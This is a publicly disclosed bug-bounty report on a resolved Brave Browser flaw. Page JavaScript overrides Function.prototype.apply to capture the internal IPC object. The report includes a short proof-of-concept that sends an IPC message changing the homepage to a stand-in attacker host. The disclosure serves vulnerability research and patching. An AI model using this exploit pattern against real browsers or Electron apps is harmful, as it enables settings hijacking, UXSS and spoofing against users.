---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-09-18
submitted: 2016-12-03T21:36:17.831Z
bounty_usd: null
votes: 53
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "masatokinugawa"
source: "https://hackerone.com/reports/188086"
title: "Sending arbitrary IPC messages via overriding Function.prototype.apply"
---
# Sending arbitrary IPC messages via overriding Function.prototype.apply

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 53 | **Program:** Brave Software | **Disclosed:** 2018-09-18

- Report: [https://hackerone.com/reports/188086](https://hackerone.com/reports/188086)
- CWE: Command Injection - Generic
- Submitted: 2016-12-03T21:36:17.831Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.

## Tested on: 
Brave	0.12.11

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change2.html 
```
<script>
Function.prototype.apply=function(ipc){
    ipc.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
}
</script>
<div style="visibility:hidden">
<embed src=".swf"></embed>
</div>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `apply` in the `ipc_utils.js` is overwritten: 
```
  ipcRenderer.emit = function () {
    arguments[1].sender = ipcRenderer
    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)
  }
  atom.v8.setHiddenValue('ipc', ipcRenderer)
}
```
And the 1st arguments leaks IPC method.

Could you confirm this bug?
Thanks!

## Timeline

- **Report Filed**
- **2016-12-03** @masatokinugawa: BTW, I think this bug and #187542 are a quite fatal problem among bugs that occur on the browser. The proper rewards is important to me and also future reporters. Could you reconsider whether $300 bounties is the really proper amount by comparing the reported other bugs?
Thanks!
- **2016-12-04** @diracdeltas: @masatokinugawa I agree that your bugs are quite serious and would warrant higher bounties if reported in Chrome/FF. However, given that we are a small seed-funded company with a handful of engineers, it's difficult for us to award much higher. Our typical bounties are: $50 for low-sev issues, $100 for medium, $150 for high, and $200+ for critical. Your $300 bounty was the highest that we've given out so far, by a factor of 2.

We will be increasing bounties after our next funding round.
- **Report Triaged**
- **2016-12-04** @masatokinugawa: I understand it. Thank you for the clear explanation!
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Bounty Awarded**
